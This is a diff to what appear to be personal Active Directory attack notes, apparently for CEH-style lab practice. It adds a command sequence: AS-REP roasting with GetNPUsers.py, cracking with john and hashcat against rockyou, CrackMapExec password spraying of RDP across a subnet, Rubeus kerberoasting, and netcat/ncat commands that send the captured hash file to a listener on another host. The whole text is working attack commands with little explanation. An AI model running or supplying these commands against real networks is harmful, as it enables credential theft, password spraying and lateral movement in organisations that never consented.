@@ -67,4 +67,12 @@ AD -->
 pyhon3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtool/user.txt -dc-ip 10.10.1.12
 john --wordlist=/root/ADtools/rockyou.txt joshuahash.txt
 
+find the network same password
 cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"
+
+rubeus.exe kerberoast /outfile:hash.txt
+
+nc -lvp 9999 > hash.txt
+ncat.exe -w 3 10.10.1.13 9999< hash.txt
+
+hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt
